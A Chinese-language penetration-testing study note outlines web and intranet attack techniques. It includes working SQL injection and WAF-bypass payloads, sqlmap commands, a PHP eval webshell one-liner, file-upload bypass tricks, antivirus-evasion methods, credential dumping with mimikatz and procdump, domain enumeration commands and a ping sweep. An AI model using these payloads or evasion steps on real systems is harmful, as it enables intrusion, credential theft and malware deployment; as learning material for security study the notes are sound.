---
tags:
  - tech/security
  - type/concept
  - status/growing
description: 网络安全知识汇总
created: 2025-12-07T17:00:00
updated: 2025-12-07T17:00:00
---

# 网络安全

**上级索引**：[[Cybersec MOC]]

## 信息收集

### CDN检测

ping网站查看各地返回的IP地址
**获取真实IP**：
1. 看邮件地址
2. 看历史DNS记录
3. 国外地址访问
4. 黑暗引擎
5. 社工（结合ip地址和备案号地址等）

**Github监控**
便于手机整理最新exp或poc
便于发现相关测试目标的资产

**各种子域名查询**
**DNS，备案，证书**
**全球节点请求cdn**
枚举爆破或解析子域名对应
便于发现管理员相关的注册信息

**黑暗引擎**
fofa，shodan，zoomeye

**微信公众号接口获取**
**内部群内部应用内部接口**

### 网站
**站点搭建分析**
- 目录类型
- 端口类型
- 子域名
- 类似域名
- 旁注（同服务器不同站点），C段站点（同网段，不同服务器，不同站点）
- 搭建软件特征

**waf**
使用wafw00f工具检测


## Web漏洞

### sql注入漏洞

#### mysql注入
MYSQL5.0 以上版本：自带的数据库名 information_schema  
information_schema：存储数据库下的数据库名及表名，列名信息的数据库  
information_schema.schemata：记录库名信息的表  
information_schema.tables：记录表名信息的表  
information_schema.columns：记录列名信息表  

获取相关数据：
1. 数据库版本-看是否符合 information_schema 查询-version()   -5.5.532
2. 数据库用户-看是否符合 ROOT 型注入攻击-user()       -root@localhost
3. 当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os-win
4. 数据库名字-为后期猜解指定数据库下的表，列做准备-database()    -syguestbook

load_file('route')  读取文件
union select 1,'x',3 into outfile 'route' 写入文件

**防注入**：
1. 魔术引号（magic_quotes_gpc） //HEX编码或宽字节绕过
2. 内置函数，int等
3. 自定义关键字，select等
4. WAF防护软件：安全狗，宝塔等


##### union联合注入

1.  **判断有无注入点**
老方法：  
id=1 and 1=1 limit 0，1 正常  
id=1 and 1=2 limit 0，1 错误  
id=1 or 1=1 limit 0，1 正常  
id=1 or 1=2 limit 0，1 正常  

新方法：
id=1alsdfjel 错误  

2. **判断字段数**
order by
3. **判断回显点**
union select 1，2，3，4 //要先使原先的查询语句不显示，如id=1 and 1=2 limit 0，1
4. **获取数据**
    - ?id=-1' union select 1,2,database() --+ //数据库名
    - ?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+ //所有数据库
    - ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 
    or
    ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+ //指定数据库中表名
    - ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='maoshe' and table_name='admin' --+ //指定数据库，表名的所有字段名
    - ?id=-1' union select 1,2,group_concat(username,password) from users --+ //具体数据

##### 报错注入
前提：页面会显示数据库报错信息。
得到报错信息、获取所有数据库名、获取指定数据库所有表名、获取指定数据库指定表中所有字段名、获取具体数据。

数据库名
?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
##### 布尔盲注
情况：没有显示位、没有报错信息，但是有SQL语句执行错误信息输出的场景，仅仅通过报错这一行为去判断SQL注入语句是否执行成功。

数据库长度
?id=1' and (length(database()))>7 --+	
?id=1' and (length(database()))>8 --+
##### 时间盲注
前提：页面上没有显示位，也没有输出SQL语句执行错误信息。 正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之后，页面的返回速度明显慢了5秒。
缺点：因为是通过sleep()函数影响的响应时间来判断语句是否执行，所以比布尔盲注更慢，真实环境下时间盲注一个注入点需要跑大概五六个小时。

猜解数据库
数据库个数
?id=1 and if((select count(schema_name) from information_schema.schemata)=9,sleep(5),1)

第一个数据库名有多少个字符
?id=1 and if((select length(schema_name) from information_schema.schemata limit0,1)=18,sleep(5),1)  

##### sqlmap注入
基础探测命令
联合查询注入：

.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=U -v 3
报错注入：

.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=E -v 3
布尔盲注：

.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=B -v 3
时间盲注：

.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=T -v 3
爆破数据
--current-db 当前使用的数据库  
--dbs 列出数据库信息  
-D 指定数据库，爆破指定数据库中的表  
-D 数据库名 --tables  
-T 指定数据表名，爆破指定表中的字段  
-D 库名 -T 表名 --columns  
-C 指定字段名，爆破具体数据  
--dump 将数据导出、转储  

指定库、表、字段，查询具体数据  
.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=T -v 3 -D  

##### post注入

用 # 注释  

##### cookie注入

##### HTTP头部注入

##### json注入

##### 插入注入

##### 二次注入

##### dnslog带外注入

##### 堆叠注入
http://ceye.io/
https://github.com/ADOOO/DnslogSqlinj

##### WAF绕过注入
**数据**
- 大小写
- 加密解密
- 编码解码
- 等价函数
- 特殊符号 mysql注释符号/**/
- 反序列化
- 注释符混用

**方式**s
- 更改提交方式
- 变异

**其他**
- **Fuzz大法**:
  https://zhuanlan.zhihu.com/p/344008210
- 数据库特性
- 垃圾数据溢出
- **HTTP参数污染**：
  构造请求包含多个相同参数名但具有不同参数值的参数。由于应用程序解析参数时可能存在解析顺序或解析方式的不一致性，攻击者可以利用这种不一致性来影响应用程序的行为。不同的解析方式可能导致应用程序选择了不同的参数值，从而导致意外的结果或绕过安全控制。
- 白名单：
  URL白名单，IP白名单，爬虫白名单，静态资源


**example**
- ```
  database/**/()   '/**/' 为mysql注释符 绕过database()检测
- ```
  union #a
  select 1,2,3#   'a'可以绕过安全狗的联合注入检测，再通过'#'使sql语句正常执行
- ```
  ?id=1/**&id=-1 union select 1,2,3#*/    /** */为mysql注释符，安全狗只检测到id=1，但由于参数污染，网站接受了id=-1 union select 1,2,3


### 文件上传漏洞

- 客户端
  - js检查：
  本地禁用JavaScript（前端检测）
  burp抓包（发送往服务器）
  复制前端代码，编辑后本地运行
- 服务端
  - 检查后缀
    - 黑名单
      1. 上传特殊可解析后缀：
      用.phtml .phps .php5 .pht进行绕过
      条件：在apache的httpd.conf中有如下配置代码：AddType
      application/x-httpd-php .php .phtml .phps .php5 .pht
      2. 上传.htacess：
      创建一个.htaccess文件，里面写上
      <FilesMatch "4.png">
      SetHandler application/x-httpd-php
      这串代码的意思是如果文件中有一个4.png的文件，他就会被解析为.php
      条件：AllowOverride all且文件名字不被修改
      3. 后缀大小写，点，空着，::$$DARA，双后缀名绕过
      4. 配合解析漏洞
        - Apache陌生后缀解析漏洞
        - Apache换行解析漏洞
    - 白名单
     1. MIME绕过
     2. %00，0x00截断
  - 检查内容
    1. 文件头检查
    2. 突破getiamgesize()
    3. 突破exif_imagetype()
    4. 二次渲染
  - 代码逻辑
    1. 条件竞争

上传文件
- 返回文件速度
  - 快，为客户端检查
  - 慢，服务端检查  -是否可以上传图片后缀的非图片文件
    - 是，检查后缀  -是否可以上传任意后缀
      - 是，黑名单
      - 否，白名单
    - 否，检查内容（或逻辑）  -上传后图片大小，颜色，md5是否变化
      - 是，重新渲染
      - 否，只读取内容

%00只能用于php版本低于5.3的
**条件竞争**：move_uploaded_file( $temp_file,$upload_file)
move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 /.

#### 漏洞
**解析漏洞**
IIS6/7.x，Apache，Nginx
**CMS漏洞**
某CMS上传1
**其他漏洞**
编辑器漏洞，CVE漏洞
#### waf绕过
数据溢出-防匹配(xxx...)
符号变异-防匹配(' " ; )
- filename="a.php

数据截断-防匹配(%00 ; 换行)
- filename="a.php%00.jpg"
- filename="a.php;.jpg"

重复数据-防匹配(参数多次)
- filename="a.jpg"filename="a.jpg"filename="a.jpg"...filename="a.php"

一句话木马
<?php @eval($_POST['r00ts']);?> 



### XSS跨站脚本漏洞

反射型，持久型，dom型  

#### 持久型

**XSS平台**  

xss platform  

**XSS工具**  

webshell箱子  
beef  


##### 绕过


**HTTP only**：
- 未保存密码，表单劫持
- 保存密码，浏览器读取

**代码过滤**
- **实体化标签**：
  - ```"><script>alert(1)</script>  //用引号尖括号标记```
  - 利用搜索框和onclick函数
  - Unicode编码

**WAF拦截**
标签语法替换
- 特殊字符: / 在js中代表结束 <a /href="sdfsadf">

**XSStrike**
XSS工具


##### CSRF(Cross-Site Request Forgery)
**原理**：
1. 用户输入账号信息请求登录A网站。
2. A网站验证用户信息，通过验证后返回给用户一个cookie
3. 在未退出网站A之前，在同一浏览器中请求了黑客构造的恶意网站B
4. B网站收到用户请求后返回攻击性代码，构造访问A网站的语句
5. 浏览器收到攻击性代码后，在用户不知情的情况下携带cookie信息请求了A网站。此时A网站不知道这是由B发起的。那么这时黑客就可以进行一下骚操作了！

两个条件：
- 用户访问站点A并产生了cookie
- 用户没有退出A同时访问了B

**挖掘**：
1. 抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞
2. 如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。
3. 利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等

**防御**
- 验证 HTTP Referer 字段：在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址
- 在请求地址中添加 token 并验证
- 在 HTTP 头中自定义属性并验证


##### SSRF(Server-Side Request Forgery)


**原理**：
SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。

**挖掘**：
1. Web功能上：
  - 分享：通过URL地址分享网页内容
  - 转码服务
  - 在线翻译
  - 图片加载与下载
  - 图片，文章收藏功能
  - 未公开的api实现以及其他调用URL的功能

2. 从URL关键字中寻找：
share，wap，url,link,src,source,target,u,3g,display,sourceURI,imageURL,domain

**验证** 
burp suite抓包
右键打开图片

**绕过**
http://A.com@10.10.10.10
ip地址转换成进制

### RCE代码及命令执行漏洞
#### 代码执行
##### 脚本

php java python

##### 产生

**web源码**
thinkphp eyoucms wordpress

**中间件平台**
Tomcat Apache Redis

**其他环境**
PHP-CGI
Jenkins-CI
Java RMI

##### 检测
白盒：代码审计
黑盒：漏洞扫描工具，公开漏洞，手工看参数值及功能点

##### 防御
敏感函数禁用，变量过滤或固定，WAF产品

#### 命令执行
php里反引号可以把输出的变量转义作为Shell命令执行
系统 linux，windows

### 文件操作安全
#### 文件包含漏洞
**本地包含**
无限制，有限制
%00截断 条件：magic_quotes_gpc=off phpversion<5.3.4
长度截断 条件： windows，点号长于256；linux长于4096

**远程包含**
无限制，有限制
各种协议？伪协议

#### 文件下载漏洞
**产生**：任何语言代码下载功能函数
**作用**：配合扫描工具查看网站目录，下载想要的文件

#### 文件读取漏洞
**产生**：任何语言代码获取功能函数


### 业务逻辑(逻辑越权)


#### 水平垂直越权

**越权**
水平越权（获得同级用户权限）
垂直越权（获得更高级的用户权限）
**登录**
暴力破解，本地加密传输，Cookie脆弱，Session劫持，密文比对认证
**业务**
订单ID，手机号码，用户ID，商品ID，其他
**验证**
暴力破解，绕过测试，自动识别
**数据**
支付篡改，数量篡改，请求重放，其他
**找回**
客户端回显，Response状态，Session覆盖，弱Token缺陷，找回流程绕过，其他
**接口**
调用遍历，参数篡改，未授权访问，webservice测试，callback自定义
**回退**
回退重放
**工具**
小米范越权工具
secscan-authcheck


#### 登录脆弱
**字典**
password_brute_dictionary

#### 支付数据篡改
https://www.secpulse.com/archives/67080.html

#### 找回机制
Response状态值，验证码爆破，找回流程绕过
- 客户端回显 数据包里显示发送的验证码

#### 接口调用
短信轰炸，来电轰炸

#### 验证安全
**Token**
爆破，回显，固定
**验证码**
爆破，识别，复用，回显，绕过
识别插件：captcha-killer,Pkav_Http_Fuzz


### 反序列化
序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。

#### PHP反序列化
**原理**
PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，是因为程序对输入数据处理不当导致的.
反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。
**前提**：
- 必须有 unserailize() 函数
- unserailize() 函数的参数必须可控（为了成功达到控制你输入的参数所实现的功能，可能需要绕过一些魔法函数
**技术**
- 有类:_construct,_destruct,_wakeup,_toString
- 无类

**利用**
真实应用下
CTF

**危害**
SQL注入，代码执行，目录遍历

https://www.cnblogs.com/fish-pompom/p/11126473.html


#### Java反序列化
在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法被重写不当时产生漏洞
**标志**
以rO0AB开头：Java序列化base64加密
以aced开头：Java序列化的16进制
**利用**
Payload生成器：ysoserial
自定义检测工具或脚本

**检测**
- 黑盒：
  - 数据格式点：
    - HTTP请求中的参数
    - 自定义协议
    - RMI协议
    - 子主题5

  特定扫描

- 白盒：
  - 函数点：
    - ObjectinputStream.readObject
    - ObjectinputStream.readUnshared
    - XmlDecoder.readObject
    - XStream.fromXML
    - JSON.parseObject
  - 组件点：参考ysoserial库
  - 代码点：
    - RCE执行
    - 数据认证

### XML&XXE

**危害**：
文件读取，RCE执行，内网攻击，DOS攻击
**检测**：
- 白盒
  - 函数及可控变量查找
  - 传输和存储数据格式类型
- 黑盒
  - 人工
    - 数据格式类型判断
    - Content-type值判断：text/xml，application/xml
    - 更改Content-Type值看返回
  - 工具
**利用**：
- 输出形式
  - 有回显
    - 协议玩法：http，file，有脚本支持协议
    - 外部引用
  - 无回显
    - 外部引用-反向链接配合
- 过滤绕过
  - 协议玩法
  - 外部引用
  - 编码UTF

## Java安全
- 综合常规
  - SQL注入
  - 路径遍历
  - XSS
  - 反序列化
  - XML&XXE
  - CSRF&SSRF
- 访问控制
  - 对象引用
  - 缺少功能
- 身份验证
  - 身份验证绕过
  - JWT令牌
  - 重设密码
  - 安全密码
- 客户端安全
  - 前端限制
  - 客户端过滤
  - HTML篡改
- 组件安全
### JWT安全
**解释**：
JWT的全称是Json Web Token。是一种跨域验证身份的方案，JWT不加密数据，但能通过数字签名判断是否被篡改
**组成**：
头部（Header），声明（Claims），签名（Signature）
**攻击**：
- 伪造：
  - 无密钥-修改alg，删除签名
  - 有密钥-对应修改数据后重新加密
- 爆破：正对签名密钥爆破
- 配合：JWT数据中存在参数传递接受处理过程

**检测**
Javaweb，Authorization，数据包数据格式
### 预编译CASE注入

## 漏洞发现

### 操作系统
**探针**：Goby，Nmap，Nessus，OpenVAS，Nexpose
**类型**：远程执行，权限提升，缓冲区溢出
**利用**
- 工具框架：Metasploil，Searchsploit，企业单位内部产品
- 单点EXP：cnvd，seebug，1337day，exploit-db，Packetstorm Security
- 复现文章：各种资讯来源
**修复**：打补丁，关上入口，防护应用

### WEB应用
**已知CMS**
- 漏洞平台：cnvd，seebug，1337day,exploit-db,Packetstorm Security
- 工具框架：cmsscan,wpscan,joomscan,drupalscan
- 代码审计：函数点挖掘，功能点挖掘，框架挖掘
**开发框架**
- PHP：Yii，Laravel，thinkphp
- Java：Shire，Struts，Spring，Maven
- Python：Flask，Django，Tomado
**未知CMS**
- 工具框架：xray，awvs，appscan，企业公司内部产品
- 人工探针：应用功能，URL参数，盲猜测试
### APP应用
**抓包**
- http/https：Burpsuite，Charies，Fiddler，抓包精灵，其他
- 其他协议： wireshark
**协议**
- WEB协议类
- 其他协议类
**逆向**
- 一键提取APK涉及URL
- 反编译重写代码段编译测试

### 服务协议
端口服务
API接口：wsdl，awvs


## WAF绕过
**信息收集**
- 测试环境：aliyun-os，safedog
- 绕过分析：抓包技术，AF说明，FUZZ测试
- 绕过手法
  - 数据包特征
    - 请求方式
      - Head：请求速度快，易被拦截
    - 模拟用户
    - 爬虫引擎
    - 白名单机制
  - 请求速度
    - 延时
    - 代理池
    - 爬虫引擎
    - 白名单机制

**漏洞发现**
- 工具
  - 综合：awvs，xray，appscan
  - 单点：tpscan，wpscan，st2scan
- 触发
  - 扫描速度
    - 延时
    - 代理池
    - 白名单
  - 工具指纹
    - 特征修改
    - 模拟用户
  - 漏洞Payload
    - 数据变异
    - 冷门扫描
    
**漏洞利用**

**权限控制**
- 脚本：ASP，PHP，jsp，aspx，py，war
- 工具：菜刀，蚁剑，冰蝎
- 代码：加密混淆，变量覆盖，异或生成
- 行为：指纹变异，自写轮子
- 检测：常规安全脚本工具使用



## 代码审计
- 语言：PHP，JAVA
- 框架：无框架，有框架
- 漏洞：sql注入，文件上传，XSS狂战，RCE执行，文件包含，反序列化，其他漏洞
- 案例：demo段，完整源码，框架源码
- 技巧：随机挖掘，定点挖掘，批量挖掘
- 工具：RIPS，Fortify，Seay系统

### 漏洞关键字
- sql注入：
  select，insert，update，mysql_query,mysqli
- 文件上传：
  $_FILES,type="file",上传,move_uploaded_file()
- xss跨站：
  print,print_r,echo,sprintf,die,var_dump,var_export
- 文件包含：
  include,include_once,require,require_once
- 代码执行：
eval,assert,preg_replace,call_user_func,call_user_func_array
- 命令执行：
  system,exec,shell_exec,``,passthru,pcntl_exec,popen,proc_open
- 变量覆盖：
  extract(),parse_str,importrequestvariables(),$$
- 反序列化：
  serialize(),unserialize(),_construct,_destruct
- 其他漏洞：
  unlink(),file_get_contents(),show_source(),file(),fopen()
- 通用关键字：
  $_GET,$_POST,$_REQUEST,$_FILES,$_SERVER


## 权限提升

- Webshell
  - 后台
    - 功能点
      - 文件上传
      - 模板修改
      - SQL执行
      - 数据备份
    - 思路点
      - 已知程序
        - 网上资料
        - 代码审计
      - 未知程序
        - 找功能点
  - 漏洞
    - 单点漏洞
    - 组合漏洞
  - 第三方
    - 编辑器
    - 中间件
    - phpmyadmin
- 其他权限
  - 数据库
  - 服务类
    - FTP
    - RDP
    - SSH
  - 第三方接口
    - 邮件
    - 支付
    - 空间商
- 服务器系统
  - windows
    - 针对环境 
      - web
      - 本地
    - 提权方法
      - 数据库，溢出漏洞，令牌窃取，第三方软件，AT&SC&PS，不安全的服务权限，不带引号的服务路径，Unattended installs，AlwaysinstallElevated
    - 针对版本
  - linux

 信息收集-补丁筛选-利用MSF或EXP-执行
 **工具**
 Windows：Wes，WindowsVulnScan，
 Linux：Vulmap


## 免杀
Tools：shellcode，msf


### 源代码：
加密：xor，aes，Hex，Rc4 Base64+aes，反序列化
PowerShell-文件模式-混淆过某绒
PowerShell-文件模式-分离过某 60
PowerShell-文件模式-特征修改过 DF
PowerShell-EXE 模式-Ladon&Win-PS2
PowerShell-命令模式-加载&替换&填充等

### 成品EXE：
Tools：
VirTest（定位特征码）

#### 反特征码
**通用跳转法**
特征码区域汇编移动到全 0 区域后用 jmp 调用
**花指令改入口**
添加花指令重定向修改入口地址从而打乱特征码位置
#### 反 VT 沙盒
加壳：Py-Pyinstall-UPX 等
加资源：Py-Pyinstall-Restorator
加保护：C-Project2-VMProject Shielden 等





 ## 内网安全
- 基本认知
  - 名词
    - 局域网，工作组，域环境，活动目录AD，域控制器DC
  - 域
    - 单域，父域和子域，域数和域森林
  - 认知
    - linux域渗透问题
    - 局域网技术适用问题
    - 大概内网安全流程问题
- 信息收集 
  - 基本信息
    - 版本，补丁：systeminfo 详细信息
    - 服务：net start 启动服务
    - 任务：schtasks 计划任务
    - 防护
  - 网络信息
    - 开放端口
      netstat -ano 当前网络端口开放
    - 网络环境
    - 出口代理
  - 用户信息
    **组别：**
    Domain Admins      域管理员
    Domain Computers   域内机器
    Domain Guest
    Domain Users
    Enterprise Admins  企业系统管理员用户
    Domain Controllers 域控制器
    **指令：**
    whoami /all
    net config workstation 登录信息
    net user 本地用户
    net localgroup 本地用户组
    net user /domain 获取域用户信息
    net group /domain 获取域用户组信息
    wmic useraccount get /all 涉及域用户详细信息
    net group "Domain Admins" /domain 查询域管理员账户
    - 域用户：
      ipconfig/all     判断存在域-dns
      net view /domain 判断存在域
      net time /domain 判断主域
      nslookup 域名    追踪来源地址
    - 本地用户
    - 用户权限
    - 对应组信息
  - 凭据信息
    - 明文
    - hash
      破解：hashcat
    - 各种口令
- 后续探针
  - 存活主机
  - 域控制器
  - 网络架构
  - 服务接口
- 权限提升
- 横向渗透
  - 局域网
  - 域环境
    - 传递
      - at&schtasks
      - psexec&smbexec
      - wmic&wmiexec
      - PTH&PTT&PTK
      - winrs&winrm&rdp
    - 漏洞
      - CVE-2014-6324
- 权限维持

Tools：
计算机用户HASH，明文获取:
mimikatz（win），mimipenguin（linux）
计算机各种协议服务口令获取:
lazagne（all），XenArmor（win）
探针域内存货主机及地址信息：
for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr "TTL="(Windows自带命令行)
模块nishang，empire
横向渗透明文hash传递：
atexec-impacket

procdump+minikatz

## SRC挖掘
特定资产


# myctf

## PHP

### 碰撞

**MD5**
md5弱比较：
0e 开头会被识别为科学记数法，结果均为0
如：240610708，aabg7XSs，aabC9RqS，s878926199a

md5强比较：
此时如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，而且不会报错，就会得到===强比较的值相等

真实md5碰撞：

### 绕过
parse_str($query)：
可以变量覆盖，也就是说我们传入的任何get参数都会解析进变量
preg_match('$')：
不比较多行，%0a换行符绕过
参数名中有下划线：
可用 “空格” “+” 绕过

